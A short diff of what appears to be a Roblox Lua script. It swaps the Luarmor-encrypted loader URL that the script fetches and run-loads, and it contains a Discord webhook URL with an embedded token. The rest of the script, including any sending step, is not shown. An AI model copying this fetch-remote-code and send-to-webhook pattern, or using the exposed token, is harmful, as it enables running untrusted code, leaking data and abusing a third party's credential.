@@ -1,5 +1,5 @@
 -- URL to fetch (Luarmor encrypted script)
-local fetchedCode = game:HttpGet("https://cdn.luarmor.net/v4_init_may312.lua")
+local fetchedCode = game:HttpGet("https://api.luarmor.net/files/v3/loaders/2a8f9cd543ee7d9672627dfcc24f6419.lua")
 
 -- Your Discord webhook URL
 local webhookUrl = "https://discord.com/api/webhooks/1396029154436317336/nElUehqp9JyDZ_REYRcQPXm7FMdnM2Rg3_zMw-Ftm7_zl5A2o4zoc7GaHaSbCi-y7xvb"
